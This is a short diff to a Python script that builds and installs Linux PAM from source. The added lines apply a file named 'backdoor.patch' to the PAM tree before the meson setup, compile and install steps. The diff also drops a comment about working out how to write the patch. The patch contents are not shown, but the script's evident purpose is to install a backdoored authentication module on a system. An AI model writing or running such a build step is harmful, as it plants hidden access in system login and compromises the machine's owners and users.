@@ -69,16 +69,18 @@ def build_pam(pam_dir: str):
     # print("[+] Running make")
     # run_cmd(["make"], cwd=str(pam_path))
 
+    subprocess.run(
+        ["patch", "-p1", "-d", PAM_DIR], input=open("backdoor.patch", "rb").read(),
+    )
+    
     print("[+] Setting up meson")
     run_cmd(["meson", "setup", "build"], cwd=str(pam_path))
-
+    
     print("[+] compilin")
     run_cmd(["meson", "compile", "-C", "build"], cwd=str(pam_path))
 
     print("[+] install")
     run_cmd(["meson", "install", "-C", "build"], cwd=str(pam_path))
-
-    # #FIGURE OUT HOW TO ACTUALLY WRITE THE PATCH
 
     print("[+] Build complete")
 
